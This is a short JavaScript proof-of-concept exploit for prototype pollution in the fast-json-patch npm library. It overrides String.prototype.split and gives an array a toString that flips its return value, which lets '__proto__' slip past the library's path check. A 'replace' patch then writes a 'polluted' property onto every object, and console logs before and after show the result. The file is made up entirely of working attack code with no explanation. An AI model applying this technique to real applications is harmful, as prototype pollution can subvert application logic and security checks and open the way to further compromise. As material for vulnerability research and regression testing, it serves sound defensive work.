var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/__proto__/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch({}, patch);
console.log({}.polluted);